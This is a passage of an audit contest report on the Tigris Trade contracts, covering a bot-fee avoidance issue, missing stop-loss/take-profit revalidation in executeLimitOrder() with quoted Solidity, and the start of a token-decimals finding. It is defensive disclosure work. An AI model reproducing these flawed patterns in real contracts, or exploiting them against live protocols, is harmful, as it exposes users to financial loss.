href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1385289111\">Alex the Entreprenerd (judge) decreased severity to QA and commented</a>:</strong></p>\n<blockquote>\n<p>With the information that I have:</p>\n<ul>\n<li>System invariants are not broken</li>\n<li>No loss of value</li>\n</ul>\n<p>Ordinary operation, which for convenience can be performed by a bot, is being operated by someone else.</p>\n<p>Because all security invariants are still holding, but the behaviour may be a gotcha, I believe QA Low to be the most appropriate severity in lack of a value leak.</p>\n<p><em>(Note: See <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468\">original submission</a> for judge’s full commentary.)</em></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1406733309\">Alex the Entreprenerd (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Per the discussion above, the Warden has shown how, any user can setup a contract to avoid paying botFees, because these are subtracted to DaoFees, these are not just a loss of yield to the DAO, but they are a discount to users, which in my opinion breaks the logic for fees.</p>\n<p>Because the finding pertains to a loss of Yield, I raised the report back to Medium Severity.</p>\n<p>I’d like to thank @0xA5DF for the clarifications done in post-judging triage.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1407792466\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176433\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176433</a> </p>\n<blockquote>\n<p>‘Don’t allow updating sl or tp and executing limitClose() at the same block’</p>\n</blockquote>\n<p>The recommended mitigation wouldn’t work, because this would result in a separate high-severity risk. We decided on tracking the timestamp of the last limit order update, and if the order gets executed before a second has passed then the bot doesn’t earn bot fees. This gives every bot a fair chance at being rewarded without incentivizing the trader to execute their own order.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-stoplosstakeprofit-should-be-validated-again-for-the-new-price-in-tradingexecutelimitorder\" style=\"position:relative;\"><a href=\"#m-18-stoplosstakeprofit-should-be-validated-again-for-the-new-price-in-tradingexecutelimitorder\" aria-label=\"m 18 stoplosstakeprofit should be validated again for the new price in tradingexecutelimitorder permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512\">[M-18] StopLoss/TakeProfit should be validated again for the new price in <code>Trading.executeLimitOrder()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512\">hansfriese</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/353\">bin2chen</a></em></p>\n<p>The open price of a stop order might be changed during execution but it doesn’t validate StopLoss/TakeProfit for the changed price.</p>\n<p>As a result, the executed market order might be closed immediately and there would be an unexpected loss for users.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As we can see from <code>executeLimitOrder()</code>, the open price might be changed to the current price for the stop order.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2022</span><span class=\"mtk1\">-</span><span class=\"mtk7\">12</span><span class=\"mtk1\">-</span><span class=\"mtk12\">tigris</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">480</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeLimitOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">481:         </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_id</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">482:         </span><span class=\"mtk10\">PriceData</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_priceData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">483:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">484</span><span class=\"mtk1\">:     ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">485:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">486:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">487</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">488</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_checkDelay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">489</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">tradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_checkGas</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">490</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk11\">paused</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TradingPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">491</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">limitDelay</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">492</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Trade</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trade</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">trades</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">493</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">494</span><span class=\"mtk1\">:             (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_spread</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">tradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVerifiedPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_signature</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">495</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;5&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">+</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">*</span><span class=\"mtk12\">limitOrderPriceRange</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">-</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">*</span><span class=\"mtk12\">limitOrderPriceRange</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">direction</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">499</span><span class=\"mtk1\">:             } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">direction</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">500</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">501</span><span class=\"mtk1\">:             } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">direction</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">502</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">503</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">504</span><span class=\"mtk1\">:             } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">505</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">506</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit check sl/tp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">507</span><span class=\"mtk1\">:             } </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">508</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">direction</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">509</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_spread</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">510</span><span class=\"mtk1\">:             } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">511</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_spread</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">512</span><span class=\"mtk1\">:             }</span></span></span></code></pre>\n<p>But it doesn’t validate sl/tp again for the new price so the order might have an invalid sl/tp.</p>\n<p>The new price wouldn’t satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.</p>\n<p>Originally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Recommend validating sl/tp for the new <code>trade.price</code> in <code>Trading.executeLimitOrder()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1377414952\">TriHaz (Tigris Trade) disputed and commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>The open price of a stop order might be changed during execution</p>\n</blockquote>\n<p>Limit orders open price is guaranteed, so it will not be changed, so validating sl/tp again is not needed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1383191670\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@TriHaz can you please check the following line</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">504</span><span class=\"mtk1\">:             } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">505</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">506</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit check sl/tp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">507</span><span class=\"mtk1\">:             } </span></span></span></code></pre>\n<p>and re-affirm your dispute?</p>\n<p>Ultimately it looks like trade.price is changed to the new price from the feed, which is a “correct” price, but may not be a price the caller was originally willing to act on (not in range with SL / TP).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1384625791\">TriHaz (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Yes my review was not correct, the price for the stop orders are not guaranteed which makes this issue valid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1385566692\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a lack of check, limit orders that pass the logic check may be executed even though the validation for their Stop Loss / Take Profit may not be hit</p>\n<p>Given the level of detail I believe the finding to be of Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1407849401\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177423\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177423</a> </p>\n<p>Since this issue only affects TP and not SL, I only added a check for that.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-_handledeposit-and-_handlewithdraw-do-not-account-for-tokens-with-decimals-higher-than-18\" style=\"position:relative;\"><a href=\"#m-19-_handledeposit-and-_handlewithdraw-do-not-account-for-tokens-with-decimals-higher-than-18\" aria-label=\"m 19 _handledeposit and _handlewithdraw do not account for tokens with decimals higher than 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/533\">[M-19] <code>_handleDeposit</code> and <code>_handleWithdraw</code> do not account for tokens with decimals higher than 18</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/533\">yjrwkk</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/676\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/674\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/672\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/667\">Tointer</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/666\">Englave</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/593\">Avci</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/581\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/561\">0xDecorativePineapple</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/536\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/494\">Critical</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/350\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/215\">Dinesh11G</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/116\">izhelyazkov</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/115\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/105\">0x4non</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/34\">pwnforce</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675</a></p>\n<h3 id=\"impact-11\" style=\"position:relative;\"><a href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In <code>Trading.sol</code> a <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675\">deposit</a> or <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700\">withdrawal</a> of tokens with decimals higher than 18 will always revert.</p>\n<p>This is the case e.g. for <code>NEAR</code> which is divisible into 10e24 <code>yocto</code></p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Change <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33\">00.Mocks.js#L33</a> to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"><code class=\"grvsc-code\"><span 